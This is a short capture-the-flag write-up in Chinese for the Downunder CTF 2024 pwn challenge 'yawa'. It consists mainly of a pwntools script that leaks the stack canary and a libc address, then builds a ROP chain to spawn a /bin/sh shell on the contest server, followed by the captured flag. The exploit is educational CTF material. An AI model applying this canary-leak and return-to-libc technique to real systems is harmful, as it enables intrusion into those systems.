---
title: "Downunder CTF 2024 Writeup"
date: 2025-07-15T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

# Downunder CTF 2024 Writeup

第一次解保護全開的 PWN 好開心WW

## yawa


### exploit

```python
import pwn

pwn.context(arch='amd64', os='linux')
libc = pwn.ELF('./libc.so.6')

#r = pwn.process('./yawa')
r = pwn.remote('2024.ductf.dev', 30010)

r.recvuntil(b'\n> ')
r.send(b'1\n' + b'a'*88 + b'\n')
r.recvuntil(b'\n> ')
r.send(b'2\n')
r.recvuntil(b'aaa\n')

canary = b'\x00' + r.recvuntil(b'\n')[:-2]
print(f'canary: {hex(pwn.u64(canary))}')

r.recvuntil(b'\n> ')
r.send(b'1\n' + b'a'*89 + canary[1:] + b'a'*7 + b'\n')
r.recvuntil(b'\n> ')
r.send(b'2\n')
r.recvuntil(b'aaa\n')

libc_init_first = int.from_bytes(r.recvuntil(b'\n')[:-1], 'little') - 0x90
print('libc_init_first: ' + hex(libc_init_first))

r.recvuntil(b'\n> ')

libc_init_first_offset = libc.symbols['__libc_init_first']
libc.address = libc_init_first - libc_init_first_offset
system_addr = libc.symbols['system']
binsh_addr = next(libc.search('/bin/sh'))
pop_rdi = pwn.ROP(libc).find_gadget(['pop rdi', 'ret'])

r.send(b'1\n' + b'a'*88 + canary + b'a'*8 + pwn.p64(pop_rdi.address) + pwn.p64(binsh_addr) + pwn.p64(pop_rdi.address + 1) + pwn.p64(system_addr))

r.recvuntil(b'\n> ')

r.send(b'0\n')

r.interactive()
```

### flag

![image](https://github.com/user-attachments/assets/74ae9cb9-f2e9-4981-bed5-fd0671895d89)

`DUCTF{Hello,AAAAAAAAAAAAAAAAAAAAAAAAA}`
